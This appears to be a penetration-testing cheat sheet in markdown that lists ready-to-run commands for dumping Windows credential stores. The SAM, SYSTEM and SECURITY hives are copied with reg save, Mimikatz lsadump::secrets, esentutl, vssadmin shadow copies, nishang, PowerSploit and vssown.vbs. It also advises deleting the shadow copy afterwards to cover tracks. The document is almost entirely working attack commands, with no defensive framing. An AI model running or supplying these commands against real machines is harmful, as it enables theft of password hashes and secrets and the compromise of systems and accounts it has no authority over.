# Reg 

Need admin privilege on the computer

```
reg save hklm\sam c:\sam
reg save hklm\system c:\system
reg save hklm\security c:\security
```

# Mimikatz

Need admin privilege on the computer

```
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::secrets
```

# HiveDump.ps1

# Shadow Copy

The same can be done with NTDS, also don't forget to delete the shadow volume.

The data are encrypted with a bootkey in SYSTEM.

## Esentutl method

Need admin privilege on the computer

```
esentutl.exe /y /vss C:\Windows\System32\config\SECURITY /d c:\security
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\sam
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d c:\system
```

## Vssadmin method

Need admin privilege on the computer

```
vssadmin create shadow /for=C: 
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SECURITY C:\SECURITY
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SAM C:\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SYSTEM C:\SYSTEM
vssadmin delete shadows /shadow=$ShadowCopyId 
```

## Copy-VSS Method

Need admin privilege on the computer

https://github.com/samratashok/nishang

```
Import-Module .\nishang.psm1
Copy-VSS -DestinationDir C:\
```

Then get the hive on the created drive:

```
C:\windows\System32\config\SYSTEM
C:\windows\System32\config\SAM
```

## Powersploit Method

https://github.com/PowerShellMafia/PowerSploit

```
Import-Module .\PowerSploit.psm1
New-VolumeShadowCopy -Volume C:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SECURITY C:\SECURITY
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SAM C:\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SYSTEM C:\SYSTEM
```

## Vssown method

Execute vba script with admin privilege on the computer

https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs

```
cscript vssown.vbs /start
cscript vssown.vbs /create c
cscript vssown.vbs /list
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SECURITY C:\SECURITY
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SAM C:\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SYSTEM C:\SYSTEM
cscript vssown.vbs /delete 
```


